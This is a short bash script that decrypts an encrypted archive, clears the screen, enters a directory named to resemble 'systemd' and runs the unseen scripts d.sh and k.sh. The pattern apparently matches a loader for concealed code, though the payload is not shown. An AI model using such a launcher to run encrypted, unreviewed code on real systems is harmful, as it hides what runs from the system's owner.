#!/bin/bash

openssl enc -d -aes-256-cbc -pbkdf2 -in main.tar.gz.enc | tar xz
clear
cd sysd-main || { echo "Failed to cd into sysd-main"; exit 1; }
chmod +x d.sh k.sh
./d.sh
